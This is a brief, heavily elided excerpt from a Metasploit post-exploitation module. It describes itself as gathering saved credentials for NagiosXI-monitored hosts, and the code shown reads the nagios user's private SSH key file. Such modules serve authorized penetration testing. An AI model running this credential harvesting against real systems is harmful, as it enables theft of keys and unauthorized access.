  ...
  class MetasploitModule < Msf::Post
    ...
    def initialize(info={})
      super(update_info(info, {
        ...
        'Description'    => %q{
          This module gathers saved credentials of NagiosXI monitored hosts and services.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>         [
            'Cale Smith',   # @0xC413
    ...
    def run
      ...
      ssh_key = get_file('/home/nagios/.ssh/id_rsa')

      if ssh_key.nil?
        print_status('No SSH key found')
      else
        print_good('SSH key found!') # + ssh_key)
      end
